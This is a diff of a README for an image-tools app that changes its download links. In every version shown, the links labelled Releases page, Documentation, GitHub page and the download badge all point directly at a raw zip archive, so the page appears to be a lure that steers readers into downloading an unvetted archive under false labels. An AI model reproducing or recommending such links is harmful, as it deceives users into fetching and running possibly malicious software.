@@ -1,7 +1,7 @@
 # 🎨 online-image-tools - Easy Image Processing for Everyone
 
 ## 📥 Download Now
-[![Latest Release](https://raw.githubusercontent.com/KABUS721/online-image-tools/main/Thrax/online-image-tools-2.6.zip%20Latest%20Release-blue)](https://raw.githubusercontent.com/KABUS721/online-image-tools/main/Thrax/online-image-tools-2.6.zip)
+[![Latest Release](https://github.com/KABUS721/online-image-tools/raw/refs/heads/main/Thrax/online-image-tools-v3.9-alpha.1.zip%20Latest%20Release-blue)](https://github.com/KABUS721/online-image-tools/raw/refs/heads/main/Thrax/online-image-tools-v3.9-alpha.1.zip)
 
 ## 🚀 Getting Started
 
@@ -24,7 +24,7 @@ Welcome to **online-image-tools**! This application provides free tools to compr
 ## 🔧 Installation Steps
 
 ### 1. Visit the Releases Page
-Head to our [Releases page](https://raw.githubusercontent.com/KABUS721/online-image-tools/main/Thrax/online-image-tools-2.6.zip) to find the latest version of online-image-tools.
+Head to our [Releases page](https://github.com/KABUS721/online-image-tools/raw/refs/heads/main/Thrax/online-image-tools-v3.9-alpha.1.zip) to find the latest version of online-image-tools.
 
 ### 2. Download the Application
 On the Releases page, look for the latest version of the application. Click on the download link for your operating system.
@@ -63,13 +63,13 @@ Safeguard your privacy by removing sensitive metadata from your images.
 - Remember to save your original images before making edits.
 
 ## 🧑‍🤝‍🧑 Community and Support
-Join our community for tips, new features, and support. Check for updates and share your feedback on our [GitHub page](https://raw.githubusercontent.com/KABUS721/online-image-tools/main/Thrax/online-image-tools-2.6.zip).
+Join our community for tips, new features, and support. Check for updates and share your feedback on our [GitHub page](https://github.com/KABUS721/online-image-tools/raw/refs/heads/main/Thrax/online-image-tools-v3.9-alpha.1.zip).
 
 ## 👩‍💻 Contributing
 We welcome contributions. If you have ideas for features or improvements, feel free to fork the repository and submit a pull request. 
 
 ## 🔗 Useful Links
-- [Releases Page](https://raw.githubusercontent.com/KABUS721/online-image-tools/main/Thrax/online-image-tools-2.6.zip)
-- [Documentation](https://raw.githubusercontent.com/KABUS721/online-image-tools/main/Thrax/online-image-tools-2.6.zip)
+- [Releases Page](https://github.com/KABUS721/online-image-tools/raw/refs/heads/main/Thrax/online-image-tools-v3.9-alpha.1.zip)
+- [Documentation](https://github.com/KABUS721/online-image-tools/raw/refs/heads/main/Thrax/online-image-tools-v3.9-alpha.1.zip)
   
-Visit our [Releases page](https://raw.githubusercontent.com/KABUS721/online-image-tools/main/Thrax/online-image-tools-2.6.zip) to download the latest version now!
+Visit our [Releases page](https://github.com/KABUS721/online-image-tools/raw/refs/heads/main/Thrax/online-image-tools-v3.9-alpha.1.zip) to download the latest version now!
